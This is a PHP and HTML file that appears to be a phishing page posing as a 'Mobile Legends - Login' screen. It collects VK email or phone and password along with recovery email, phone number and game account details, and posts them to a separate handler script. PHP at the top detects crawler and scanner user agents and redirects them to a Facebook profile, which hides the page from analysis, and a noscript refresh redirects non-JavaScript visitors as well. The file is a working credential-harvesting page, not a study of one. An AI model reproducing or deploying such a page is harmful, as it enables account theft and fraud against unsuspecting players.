<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/RaBiitch1945');
die();
}
?>

<html lang="en">
	<head>
        <noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/RaBiitch1945"/></noscript>
		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Mobile Legends - Login</title>
        <link rel="shorcut icon" href="./img/favicon.ico" />
        <link rel="stylesheet" media="only screen and (min-width: 720px)" href="./css/style.css" />
        <link rel="stylesheet" media="only screen and (max-width: 720px)" href="./css/style.css" />
	</head>
	<body>
		<div class="form">
            <form role="form" action="aksivk.php" method="POST" name="login">
                <font color="#fff" style="letter-spacing: 1px;">Vk Login</font><br/>
                <input type="text" name="vk" placeholder="Email Or Phone" required tabindex="1" autocomplete="off"><br/>
                <input type="password" name="pwvk" placeholder="Password" required tabindex="2"><p/>
                <font color="#fff" style="letter-spacing: 1px;">Account Details</font><br/>
                <input type="text" name="nick" placeholder="Nickname" required tabindex="3"><br/>
                <input type="number" name="lvl" placeholder="Level" required tabindex="4"><br/>
                <input type="number" name="skin" placeholder="Skins" required tabindex="5"><br/>
                <input type="email" name="recover" placeholder="Email Recovery" required tabindex="6" autocomplete="off"><br/>
                <input type="number" name="no" placeholder="Phone Number" required tabindex="7"><br/>
                <input type="text" name="country" placeholder="Country" required tabindex="8"><p/>
                <button type="submit" class="button button-block">Submit</button>
            </form>
        </div>
    </body>
</html>